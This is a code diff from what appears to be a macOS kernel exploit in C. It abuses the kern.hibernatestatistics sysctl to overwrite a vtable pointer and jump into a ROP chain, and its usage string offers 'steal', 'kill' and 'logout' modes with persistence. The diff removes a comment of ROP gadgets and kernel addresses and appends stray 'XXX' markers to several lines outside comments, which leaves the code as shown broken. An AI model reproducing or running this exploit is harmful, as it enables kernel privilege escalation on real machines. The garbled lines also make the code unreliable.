@@ -105,7 +105,7 @@ typedef struct
     const char *hib_full;
     uint32_t hib_lo;
 #if 0
-    uint32_t vtab_lo;
+    uint32_t vtab_lo; XXX
 #else
     uint32_t rop_hi;
 #endif
@@ -127,18 +127,6 @@ enum
 
 int main(int argc, const char **argv)
 {
-    /*
-    mov rsi, r15; call qword ptr [rax + 0x48];
-    mov rsi, r15; call qword ptr [rax + 0x50];
-
-    push rbp; jmp qword ptr [rdi];
-
-    0xffffff80002f5005
-    0xffffff800035f3e6
-    0xffffff80008bd6b6
-    0xffffff8000903050
-    */
-
     if(argc < 2)
     {
         LOG("Usage: %s <steal|kill|logout|wait> [persist]", argv[0]);
@@ -397,7 +385,7 @@ int main(int argc, const char **argv)
 
     uint64_t ptr_addr = rop._hibernateStats + ((uint8_t*)&hib_base[2] - (uint8_t*)&hib) - rop.taggedRelease_vtab_offset;
     uint32_t *ptr_ptr = (uint32_t*)&ptr_addr;
-    //uint64_t rop_addr = rop.add__rdi__ecx;
+    //uint64_t rop_addr = rop.add__rdi__ecx; XXX
     uint64_t rop_addr = rop.jmp__vtab1_;
     uint32_t *rop_ptr = (uint32_t*)&rop_addr;
     hib.graphicsReadyTime    = ptr_ptr[0];
@@ -485,7 +473,7 @@ int main(int argc, const char **argv)
         .hib_full = "kern.hibernatestatistics",
         .hib_lo = hib_ptr[0],
 #if 0
-        .vtab_lo = ptr_ptr[0],
+        .vtab_lo = ptr_ptr[0], XXX
 #else
         .rop_hi = rop_ptr[1],
 #endif
@@ -794,7 +782,7 @@ do \
     out4:;
     for(size_t i = 0; i < 4; ++i)
     {
-        sysctlbyname(hib_names[i], NULL, NULL, &hib_save[i], sizeof(uint32_t));
+        sysctlbyname(hib_names[i], NULL, NULL, &hib_save[i], sizeof(hib_save[i]));
     }
 
     out3:;
@@ -889,7 +877,7 @@ static kern_return_t cb(void *arg)
     }
 
     // No change, no action
-    if(val == args->vtab_lo)
+    if(val == args->vtab_lo) XXX
     {
         ualarm(EXPLOIT_TIMEOUT, 0);
         return KERN_SUCCESS;
